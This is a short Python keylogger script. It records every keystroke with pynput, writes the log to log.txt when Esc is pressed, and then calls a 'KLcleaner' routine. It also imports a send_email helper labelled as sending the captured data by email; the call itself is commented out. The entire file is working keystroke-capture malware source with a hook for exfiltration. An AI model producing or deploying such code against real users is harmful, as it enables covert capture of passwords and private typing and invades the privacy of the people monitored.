from pynput.keyboard import Key, Listener # Log the data
from send_email import send_email # Send the data through Email
from KLcleaner import clean # Clean The data

keys = []
def update_log():
    with open('log.txt', mode='w') as file:
        file.writelines(str(keys))

def on_press(key):
    # print(key)
    keys.append(key)

def on_release(key):
    if key==Key.esc:
        update_log()
        # send_email()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

clean()